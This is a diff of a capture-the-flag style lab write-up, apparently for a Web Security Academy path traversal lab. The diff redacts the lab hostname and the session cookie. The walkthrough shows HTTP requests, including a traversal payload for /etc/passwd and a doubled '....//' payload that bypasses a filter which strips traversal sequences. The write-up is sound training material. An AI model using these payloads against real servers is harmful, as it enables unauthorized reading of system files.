@@ -7,13 +7,13 @@ To solve the lab, retrieve the contents of the /etc/passwd file.
 I opened Burp and the application page, forwarding the first GET request, the browser issues various other requests to load the images of each product, i chose one of those requests and send it to Repeater:
 
 GET /image?filename=30.jpg HTTP/2
-Host: 0a8d00b003c8141482108fb400120041.web-security-academy.net
-Cookie: session=8JmD1GqZsBjePsxsNudFiw0n22mxY72v
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0a8d00b003c8141482108fb400120041.web-security-academy.net/
+Referer: https://LAB_ID.web-security-academy.net/
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
@@ -23,13 +23,13 @@ Te: trailers
 Again, the parameter filename is vulnerable to a path traversal attack, but as the lab description says, the application STRIPS TRAVERSAL SEQUENCES, so when i issue the following:
 
 GET /image?filename=../../../../../../../etc/passwd HTTP/2
-Host: 0a8d00b003c8141482108fb400120041.web-security-academy.net
-Cookie: session=8JmD1GqZsBjePsxsNudFiw0n22mxY72v
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0a8d00b003c8141482108fb400120041.web-security-academy.net/
+Referer: https://LAB_ID.web-security-academy.net/
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
@@ -50,13 +50,13 @@ What i need to do to bypass this filter is duplicate the traversal sequences, so
 Request:
 
 GET /image?filename=....//....//....//....//....//....//....//etc/passwd HTTP/2
-Host: 0a8d00b003c8141482108fb400120041.web-security-academy.net
-Cookie: session=8JmD1GqZsBjePsxsNudFiw0n22mxY72v
+Host: LAB_ID.web-security-academy.net
+Cookie: session=sessionID
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
-Referer: https://0a8d00b003c8141482108fb400120041.web-security-academy.net/
+Referer: https://LAB_ID.web-security-academy.net/
 Sec-Fetch-Dest: image
 Sec-Fetch-Mode: no-cors
 Sec-Fetch-Site: same-origin
